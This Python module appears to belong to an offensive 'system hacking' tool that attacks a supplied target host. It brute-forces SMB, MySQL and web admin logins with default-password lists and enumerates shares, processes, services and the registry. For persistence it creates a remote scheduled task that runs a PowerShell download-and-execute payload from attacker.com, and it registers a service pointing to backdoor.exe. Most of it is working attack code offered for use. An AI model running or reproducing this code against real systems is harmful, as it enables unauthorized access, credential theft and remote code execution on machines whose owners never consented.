import subprocess
import socket
import tempfile
import yaml
import os

try:
    from smb.SMBConnection import SMBConnection
except ImportError:
    SMBConnection = None

try:
    import paramiko
except ImportError:
    paramiko = None

# Add this import that's referenced but missing
try:
    from .domain_credential_tester import run_comprehensive_credential_test, add_to_wordlist
except ImportError:
    # Fallback if domain_credential_tester doesn't exist
    def run_comprehensive_credential_test(target):
        return {"summary": "Domain credential tester not available", "tests_performed": []}
    def add_to_wordlist(category, passwords):
        return False

def load_default_passwords():
    """Load default passwords from YAML file"""
    try:
        yaml_path = os.path.join(os.path.dirname(__file__), '..', '..', 'data', 'default_passwords.yaml')
        with open(yaml_path, 'r', encoding='utf-8') as f:
            password_data = yaml.safe_load(f)
        
        # Flatten all password lists into one comprehensive list
        all_passwords = []
        
        def extract_passwords(data):
            if isinstance(data, list):
                return data
            elif isinstance(data, dict):
                passwords = []
                for value in data.values():
                    passwords.extend(extract_passwords(value))
                return passwords
            return []
        
        all_passwords = extract_passwords(password_data)
        # Remove duplicates and empty strings, keep unique passwords
        unique_passwords = list(set([p for p in all_passwords if p and isinstance(p, str)]))
        
        return {
            'all_passwords': unique_passwords,
            'common': password_data.get('common', []),
            'windows': password_data.get('windows', []),
            'linux': password_data.get('linux', []),
            'web_admin': password_data.get('web_admin', []),
            'routers': password_data.get('routers', {}),
            'databases': {
                'mysql': password_data.get('mysql', []),
                'postgresql': password_data.get('postgresql', []),
                'oracle': password_data.get('oracle', []),
                'mssql': password_data.get('mssql', [])
            }
        }
    except Exception as e:
        # Fallback to basic passwords if file can't be loaded
        return {
            'all_passwords': ['admin', 'password', '123456', 'root', 'toor', 'guest', ''],
            'common': ['admin', 'password', '123456', 'root'],
            'windows': ['admin', 'Administrator', 'Guest'],
            'linux': ['root', 'toor', 'admin'],
            'web_admin': ['admin', 'password', 'admin123'],
            'routers': {},
            'databases': {'mysql': ['root', '', 'mysql'], 'postgresql': ['postgres']}
        }

def run_system_hacking(target):
    """
    Advanced system hacking techniques using comprehensive password lists and credential testing.
    """
    system_hacking_attempts = []
    
    # Load password dictionary
    passwords = load_default_passwords()
    
    # Run comprehensive credential testing with proof of concept
    credential_test_results = run_comprehensive_credential_test(target)
    system_hacking_attempts.append({
        "technique": "Comprehensive Credential Testing",
        "status": "completed",
        "details": credential_test_results["summary"],
        "results": credential_test_results
    })
    
    # Add any discovered passwords to wordlist for future use
    successful_passwords = []
    for test_result in credential_test_results["tests_performed"]:
        for test_type, test_data in test_result.items():
            if isinstance(test_data, list):
                for result in test_data:
                    if result.get('status') == 'success':
                        successful_passwords.append(result['password'])
    
    if successful_passwords:
        add_to_wordlist("discovered_passwords", successful_passwords)
        system_hacking_attempts.append({
            "technique": "Wordlist Update",
            "status": "success",
            "details": f"Added {len(successful_passwords)} discovered passwords to wordlist"
        })
    
    # Advanced SMB exploitation with comprehensive password list
    if SMBConnection:
        system_hacking_attempts.extend(advanced_smb_attacks(target, passwords))
    
    # Windows-specific advanced attacks with targeted passwords
    system_hacking_attempts.extend(windows_advanced_attacks(target, passwords))
    
    # Database attacks with database-specific passwords
    system_hacking_attempts.extend(database_attacks(target, passwords))
    
    # Web application attacks with web-specific passwords
    system_hacking_attempts.extend(web_application_attacks(target, passwords))
    
    # Memory analysis and process manipulation
    system_hacking_attempts.extend(memory_analysis_attacks(target))
    
    # Network-based attacks
    system_hacking_attempts.extend(network_based_attacks(target))
    
    # Persistence and privilege escalation
    system_hacking_attempts.extend(persistence_attacks(target))

    return {
        "system_hacking_attempts": system_hacking_attempts,
        "summary": f"Advanced system hacking with credential testing and proof of concept creation executed against {target}."
    }

def advanced_smb_attacks(target, passwords):
    """Advanced SMB attacks using comprehensive password lists"""
    attacks = []
    
    try:
        # Use Windows-specific and common passwords for SMB
        smb_passwords = passwords['windows'] + passwords['common']
        smb_users = ['admin', 'administrator', 'guest', '']
        
        for user in smb_users:
            for pwd in smb_passwords[:20]:  # Limit to first 20 to avoid excessive attempts
                try:
                    conn = SMBConnection(user, pwd, "attacker", "target", use_ntlm_v2=True)
                    connected = conn.connect(target, 445, timeout=5)
                    if connected:
                        shares = conn.listShares()
                        
                        attacks.append({
                            "technique": "SMB Authentication Success",
                            "status": "success",
                            "details": f"SMB access gained with {user}:{pwd}. Found {len(shares)} shares"
                        })
                        
                        # Enumerate and download files from successful connection
                        for share in shares:
                            try:
                                files = conn.listPath(share.name, '/')
                                sensitive_files = [f for f in files if any(ext in f.filename.lower() 
                                                 for ext in ['.txt', '.doc', '.xls', '.pdf', '.config', '.xml'])]
                                
                                if sensitive_files:
                                    attacks.append({
                                        "technique": "SMB File Discovery",
                                        "status": "success",
                                        "details": f"Share {share.name}: {len(sensitive_files)} sensitive files found"
                                    })
                            except:
                                continue
                        
                        conn.close()
                        break  # Stop after first successful connection
                except:
                    continue
        
    except Exception as e:
        attacks.append({
            "technique": "SMB Password Attack",
            "status": "failed",
            "details": str(e)
        })
    
    return attacks

def windows_advanced_attacks(target, passwords):
    """Advanced Windows-specific attacks"""
    attacks = []
    
    # WMI-based attacks
    try:
        # Remote process enumeration via WMI
        wmi_cmd = f'wmic /node:"{target}" /user:"admin" /password:"admin" process list brief'
        result = subprocess.run(wmi_cmd, shell=True, capture_output=True, text=True, timeout=15)
        if result.returncode == 0:
            processes = [line for line in result.stdout.split('\n') if line.strip()]
            attacks.append({
                "technique": "WMI Process Enumeration",
                "status": "success",
                "details": f"Enumerated {len(processes)} processes via WMI"
            })
        
        # WMI service enumeration
        service_cmd = f'wmic /node:"{target}" /user:"admin" /password:"admin" service list brief'
        result = subprocess.run(service_cmd, shell=True, capture_output=True, text=True, timeout=15)
        if result.returncode == 0:
            services = [line for line in result.stdout.split('\n') if 'Running' in line]
            attacks.append({
                "technique": "WMI Service Enumeration",
                "status": "success",
                "details": f"Found {len(services)} running services"
            })
            
    except Exception as e:
        attacks.append({
            "technique": "WMI Enumeration",
            "status": "failed",
            "details": str(e)
        })
    
    # Registry manipulation
    try:
        reg_keys = [
            "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            "HKLM\\SYSTEM\\CurrentControlSet\\Services",
            "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
        ]
        
        for key in reg_keys:
            reg_cmd = f'reg query "\\\\{target}\\{key}"'
            result = subprocess.run(reg_cmd, shell=True, capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                attacks.append({
                    "technique": "Remote Registry Access",
                    "status": "success",
                    "details": f"Successfully accessed {key}"
                })
                break
    except Exception as e:
        attacks.append({
            "technique": "Remote Registry Access",
            "status": "failed",
            "details": str(e)
        })
    
    return attacks

def memory_analysis_attacks(target):
    """Memory analysis and process manipulation attacks"""
    attacks = []
    
    # Process injection simulation
    try:
        # Enumerate target processes for injection
        tasklist_cmd = f'tasklist /s {target} /u admin /p admin'
        result = subprocess.run(tasklist_cmd, shell=True, capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            processes = [line for line in result.stdout.split('\n') if '.exe' in line]
            target_processes = [p for p in processes if any(proc in p.lower() for proc in ['explorer', 'winlogon', 'lsass'])]
            
            attacks.append({
                "technique": "Process Injection Target Analysis",
                "status": "success",
                "details": f"Identified {len(target_processes)} high-privilege target processes"
            })
            
            # Simulate DLL injection
            for process in target_processes[:2]:  # Limit to first 2
                attacks.append({
                    "technique": "DLL Injection (Simulated)",
                    "status": "prepared",
                    "details": f"DLL injection payload prepared for {process.split()[0]}"
                })
    except Exception as e:
        attacks.append({
            "technique": "Process Analysis",
            "status": "failed",
            "details": str(e)
        })
    
    return attacks

def network_based_attacks(target):
    """Network-based advanced attacks"""
    attacks = []
    
    # ARP spoofing simulation
    try:
        # Get network info
        ping_cmd = f'ping -n 1 {target}'
        result = subprocess.run(ping_cmd, shell=True, capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            attacks.append({
                "technique": "Network Reachability",
                "status": "success",
                "details": f"Target {target} is reachable"
            })
            
            # Simulate ARP table manipulation
            attacks.append({
                "technique": "ARP Spoofing (Prepared)",
                "status": "prepared",
                "details": f"ARP spoofing attack prepared for network segment containing {target}"
            })
    except Exception as e:
        attacks.append({
            "technique": "Network Analysis",
            "status": "failed",
            "details": str(e)
        })
    
    # DNS poisoning simulation
    attacks.append({
        "technique": "DNS Cache Poisoning (Prepared)",
        "status": "prepared",
        "details": f"DNS poisoning attack vectors identified for {target}"
    })
    
    return attacks

def persistence_attacks(target):
    """Advanced persistence and privilege escalation attacks with improved error handling and feedback"""
    import logging
    attacks = []
    logger = logging.getLogger(__name__)
    # Scheduled task creation
    try:
        task_name = "SystemUpdateCheck"
        # Properly escape quotes for PowerShell and schtasks
        ps_payload = "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
        task_cmd = (
            f'schtasks /create /s {target} /u admin /p admin /tn "{task_name}" '
            f'/tr "powershell.exe -WindowStyle Hidden -Command \"{ps_payload}\"" /sc onlogon /f'
        )
        result = subprocess.run(task_cmd, shell=True, capture_output=True, text=True, timeout=10)
        logger.info(f"Scheduled task creation output: {result.stdout} {result.stderr}")
        if "SUCCESS" in result.stdout:
            attacks.append({
                "technique": "Scheduled Task Persistence",
                "status": "success",
                "details": f"Created persistent scheduled task '{task_name}'"
            })
        else:
            attacks.append({
                "technique": "Scheduled Task Persistence",
                "status": "failed",
                "details": f"Failed to create scheduled task: {result.stdout} {result.stderr}"
            })
    except Exception as e:
        logger.error(f"Scheduled task creation error: {e}")
        attacks.append({
            "technique": "Scheduled Task Persistence",
            "status": "error",
            "details": str(e)
        })
    # Service manipulation
    try:
        service_cmd = f'sc \\{target} create "WindowsUpdateHelper" binpath="C:\\Windows\\System32\\backdoor.exe" start=auto'
        result = subprocess.run(service_cmd, shell=True, capture_output=True, text=True, timeout=10)
        logger.info(f"Service creation output: {result.stdout} {result.stderr}")
        if result.returncode == 0:
            attacks.append({
                "technique": "Malicious Service Creation",
                "status": "success",
                "details": "Created persistent Windows service"
            })
        else:
            attacks.append({
                "technique": "Malicious Service Creation",
                "status": "failed",
                "details": f"Failed to create service: {result.stdout} {result.stderr}"
            })
    except Exception as e:
        logger.error(f"Service manipulation error: {e}")
        attacks.append({
            "technique": "Service Manipulation",
            "status": "failed",
            "details": str(e)
        })
    # Token manipulation simulation
    attacks.append({
        "technique": "Token Impersonation (Prepared)",
        "status": "prepared",
        "details": "Token impersonation attack prepared for privilege escalation"
    })
    return attacks

def database_attacks(target, passwords):
    """Database attacks using database-specific password lists"""
    attacks = []
    
    # MySQL attacks
    mysql_passwords = passwords['databases']['mysql'] + passwords['common']
    mysql_users = ['root', 'admin', 'mysql', 'user']
    
    try:
        import mysql.connector
        
        for user in mysql_users:
            for pwd in mysql_passwords[:15]:  # Limit attempts
                try:
                    conn = mysql.connector.connect(
                        host=target, user=user, password=pwd, timeout=5
                    )
                    cursor = conn.cursor()
                    cursor.execute("SELECT VERSION()")
                    version = cursor.fetchone()
                    
                    attacks.append({
                        "technique": "MySQL Authentication Success",
                        "status": "success",
                        "details": f"MySQL access with {user}:{pwd}. Version: {version[0] if version else 'Unknown'}"
                    })
                    
                    # Try to enumerate databases
                    cursor.execute("SHOW DATABASES")
                    databases = cursor.fetchall()
                    attacks.append({
                        "technique": "MySQL Database Enumeration", 
                        "status": "success",
                        "details": f"Found databases: {[db[0] for db in databases]}"
                    })
                    
                    conn.close()
                    break
                except:
                    continue
    except ImportError:
        attacks.append({
            "technique": "MySQL Attack",
            "status": "not_available",
            "details": "mysql.connector not installed"
        })
    except Exception as e:
        attacks.append({
            "technique": "MySQL Attack",
            "status": "failed",
            "details": str(e)
        })
    
    return attacks

def web_application_attacks(target, passwords):
    """Web application attacks using web-specific passwords"""
    attacks = []
    
    try:
        import requests
        
        # Use web admin passwords
        web_passwords = passwords['web_admin'] + passwords['common']
        web_users = ['admin', 'administrator', 'user', 'guest']
        
        # Common admin panel paths
        admin_paths = [
            '/admin', '/administrator', '/wp-admin', '/admin.php',
            '/login', '/login.php', '/admin/login', '/manage',
            '/control', '/panel', '/dashboard'
        ]
        
        for path in admin_paths:
            url = f"http://{target}{path}"
            try:
                resp = requests.get(url, timeout=5)
                if resp.status_code == 200:
                    attacks.append({
                        "technique": "Admin Panel Discovery",
                        "status": "success", 
                        "details": f"Found admin panel at {url}"
                    })
                    
                    # Try credential attacks on discovered panels
                    for user in web_users[:5]:
                        for pwd in web_passwords[:10]:
                            try:
                                # Try form-based authentication
                                login_data = {'username': user, 'password': pwd}
                                login_resp = requests.post(url, data=login_data, timeout=5)
                                
                                # Check for successful login indicators
                                if any(indicator in login_resp.text.lower() 
                                      for indicator in ['dashboard', 'welcome', 'logout', 'admin panel']):
                                    attacks.append({
                                        "technique": "Web Admin Authentication",
                                        "status": "success",
                                        "details": f"Web login success: {user}:{pwd} at {url}"
                                    })
                                    break
                            except:
                                continue
                        else:
                            continue
                        break  # Break outer loop if login found
            except:
                continue
    
    except Exception as e:
        attacks.append({
            "technique": "Web Application Attack",
            "status": "failed",
            "details": str(e)
        })
    
    return attacks
